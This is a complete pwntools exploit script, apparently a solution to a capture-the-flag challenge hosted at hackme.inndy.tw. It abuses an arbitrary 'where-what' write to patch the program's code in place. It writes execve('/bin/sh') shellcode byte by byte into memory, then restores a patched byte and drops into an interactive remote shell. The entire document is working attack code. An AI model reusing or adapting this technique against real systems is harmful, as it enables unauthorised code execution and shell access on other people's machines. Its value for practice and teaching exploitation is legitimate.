from pwn import *
context.log_level = "debug"
context.os = "linux"
context.arch = "amd64"
def patch(target, addr, val):
	target.sendlineafter('Where What?', "%s %s" % (hex(addr), str(val)))

def main():
	target = remote('hackme.inndy.tw', 7718)
	addr = 0x400768
	patch(target, addr, 0xB4)
	shellcode = asm(shellcraft.execve('/bin/sh'))
	addr = 0x400769
	for i, element in enumerate(shellcode):
		patch(target, addr + i, ord(element))
	patch(target, 0x400768, 0x00)
	print len(shellcode)
	target.interactive()


if __name__ == '__main__':
	main()